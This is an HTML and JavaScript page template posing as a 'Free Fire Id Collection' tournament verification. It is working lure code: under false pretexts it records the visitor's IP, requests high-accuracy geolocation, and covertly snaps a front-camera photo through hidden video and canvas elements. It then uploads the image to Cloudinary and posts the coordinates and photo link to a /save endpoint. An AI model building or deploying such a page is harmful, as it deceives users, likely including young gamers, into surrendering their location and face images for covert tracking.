<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Free Fire Id Collection</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
body {
  background: radial-gradient(circle at top, #1a0f00, #000);
}
</style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

<div class="max-w-md w-full bg-black/60 backdrop-blur-xl
            border border-orange-500/30 rounded-2xl
            shadow-2xl p-6 text-center">

  <h1 class="text-3xl font-bold text-orange-400 mb-1">
   Free Fire Id Collection
  </h1>
  <p class="text-gray-400 text-sm mb-6">
    Verification Required
  </p>

  <!-- Hidden elements -->
  <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <!-- Status Display -->
  <div id="status" class="mb-6 space-y-3">
    <!-- IP Status -->
    <div id="ipStatus" class="text-left p-3 bg-gray-900/50 rounded-lg">
      <p class="text-gray-400 text-sm mb-1">Welcome to Id Collection</p>
      <p id="ipText" class="text-gray-300 font-mono">Loading...</p>
    </div>
    
    <!-- Location Status -->
    <div id="locationStatus" class="text-left p-3 bg-gray-900/50 rounded-lg hidden">
      <p class="text-gray-400 text-sm mb-1">üìç Location Verification</p>
      <p id="locationText" class="text-gray-300">Please allow location access</p>
      <p class="text-xs text-gray-500 mt-1">
        <i class="fas fa-info-circle mr-1"></i>
        Reason: To verify you are in India for tournament eligibility
      </p>
    </div>
    
    <!-- Camera Status -->
    <div id="cameraStatus" class="text-left p-3 bg-gray-900/50 rounded-lg hidden">
      <p class="text-gray-400 text-sm mb-1"> Human Verification</p>
      <p id="cameraText" class="text-gray-300">Please allow camera access</p>
      <p class="text-xs text-gray-500 mt-1">
        <i class="fas fa-info-circle mr-1"></i>
        Reason: To verify you are a real human, not a bot
      </p>
    </div>
  </div>

  <!-- Continue Button -->
  <button id="continueBtn"
    class="w-full bg-orange-500 hover:bg-orange-600
           text-black font-bold py-3 rounded-lg text-lg mb-3">
    Start Verification
  </button>

  <!-- Loader -->
  <div id="loader"
    class="hidden mx-auto mt-4 w-10 h-10 border-4
           border-orange-400 border-t-transparent
           rounded-full animate-spin">
  </div>

  <p class="text-xs text-gray-500 mt-6">
    <i class="fas fa-lock mr-1"></i>Secure verification process
  </p>

</div>

<!-- Font Awesome -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<script>
const CLOUDINARY_URL = "<%= CLOUDINARY_URL %>";
const UPLOAD_PRESET = "<%= CLOUDINARY_UPLOAD_PRESET %>";

// DOM Elements
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const continueBtn = document.getElementById("continueBtn");
const loader = document.getElementById("loader");

// Status elements
const ipText = document.getElementById("ipText");
const ipStatusDiv = document.getElementById("ipStatus");
const locationText = document.getElementById("locationText");
const locationStatusDiv = document.getElementById("locationStatus");
const cameraText = document.getElementById("cameraText");
const cameraStatusDiv = document.getElementById("cameraStatus");

// State
let userIP = null;
let userLocation = null;
let cameraStream = null;
let currentStep = 1; // 1=IP, 2=Location, 3=Camera, 4=Complete

// Start everything when page loads
window.onload = function() {
  getIPAddress();
};

// Step 1: Get IP Address
async function getIPAddress() {
  try {
    ipText.textContent = "Fetching Safe Communication...";
    
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIP = data.ip;
    
    ipText.textContent = "Connected to safest network to communicate";
    ipStatusDiv.classList.add('bg-green-900/30', 'border', 'border-green-500/30');
    
    // Move to next step
    setTimeout(getLocation, 1000);
    
  } catch (error) {
    console.error("IP Error:", error);
    ipText.textContent = "IP: Failed to get";
    userIP = "Unknown";
    setTimeout(getLocation, 1000);
  }
}

// Step 2: Get Location
function getLocation() {
  // Show location section
  locationStatusDiv.classList.remove('hidden');
  
  if (!navigator.geolocation) {
    locationText.textContent = "Location not supported by browser";
    setTimeout(getCamera, 1000);
    return;
  }
  
  locationText.textContent = "Requesting location access...";
  
  navigator.geolocation.getCurrentPosition(
    // Success
    function(position) {
      userLocation = {
        lat: position.coords.latitude.toString(),
        lon: position.coords.longitude.toString()
      };
      
      locationText.textContent = "Location: " + userLocation.lat + ", " + userLocation.lon;
      locationStatusDiv.classList.add('bg-green-900/30', 'border', 'border-green-500/30');
      
      // Check if location is in India (approximate)
      const lat = parseFloat(userLocation.lat);
      const lon = parseFloat(userLocation.lon);
      
      // India coordinates approximately: 8.4¬∞N to 37.6¬∞N, 68.7¬∞E to 97.25¬∞E
      if (lat >= 8.4 && lat <= 37.6 && lon >= 68.7 && lon <= 97.25) {
        locationText.textContent += " ‚úì (India)";
      } else {
        locationText.textContent += " ‚ö† (Outside India)";
      }
      
      setTimeout(getCamera, 1000);
    },
    // Error
    function(error) {
      console.error("Location Error:", error);
      locationText.textContent = "Location access denied";
      userLocation = { lat: "0", lon: "0" };
      
      setTimeout(getCamera, 1000);
    },
    // Options
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

// Step 3: Get Camera
async function getCamera() {
  // Show camera section
  cameraStatusDiv.classList.remove('hidden');
  
  try {
    cameraText.textContent = "Requesting camera access...";
    
    cameraStream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user',
        width: { ideal: 640 },
        height: { ideal: 480 }
      } 
    });
    
    video.srcObject = cameraStream;
    cameraText.textContent = "Camera: Ready ‚úì";
    cameraStatusDiv.classList.add('bg-green-900/30', 'border', 'border-green-500/30');
    
    // Update button text
    continueBtn.innerHTML = '<i class="fas fa-camera mr-2"></i>Take Photo & Complete';
    
  } catch (error) {
    console.error("Camera Error:", error);
    cameraText.textContent = "Camera access denied";
    continueBtn.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Complete Without Camera';
  }
}

// Final Step: Capture and Save
async function completeVerification() {
  if (!userIP || !userLocation) {
    alert("Please wait for verification steps to complete");
    return;
  }
  
  // Disable button and show loader
  continueBtn.disabled = true;
  continueBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Processing...';
  loader.classList.remove('hidden');
  
  try {
    let imageUrl = "";
    
    // Only capture photo if camera is available
    if (cameraStream) {
      // Capture photo
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Convert to blob
      const blob = await new Promise(function(resolve) {
        canvas.toBlob(function(blob) {
          resolve(blob);
        }, 'image/jpeg', 0.8);
      });
      
      // Upload to Cloudinary
      const formData = new FormData();
      formData.append("file", blob);
      formData.append("upload_preset", UPLOAD_PRESET);
      formData.append("folder", "freefire-verification");
      
      const uploadResponse = await fetch(CLOUDINARY_URL, {
        method: "POST",
        body: formData
      });
      
      const uploadData = await uploadResponse.json();
      imageUrl = uploadData.secure_url || "";
    }
    
    // Save to backend
    const saveResponse = await fetch("/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        lat: userLocation.lat,
        lon: userLocation.lon,
        imageUrl: imageUrl
      })
    });
    
    const saveData = await saveResponse.json();
    
    if (saveData.success) {
      // Success
      continueBtn.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Verification Complete!';
      continueBtn.className = continueBtn.className.replace('bg-orange-500', 'bg-green-500');
      
      loader.classList.add('hidden');
      
      // Show success message
      setTimeout(function() {
        alert('‚úÖ Verification successful!\n\nYou can now register for the tournament.');
      }, 500);
      window.location.href="/getId"
    } else {
      throw new Error("Save failed");
    }
    
  } catch (error) {
    console.error("Final Error:", error);
    
    continueBtn.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Try Again';
    continueBtn.className = continueBtn.className.replace('bg-orange-500', 'bg-red-500');
    continueBtn.disabled = false;
    
    loader.classList.add('hidden');
    
    alert('There was an error. Please try again.');
  }
}

// Event Listener
continueBtn.onclick = completeVerification;

// Add CSS for animations
const style = document.createElement('style');
style.textContent = `
  .fa-spinner {
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  #continueBtn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }
`;
document.head.appendChild(style);
</script>

</body>
</html>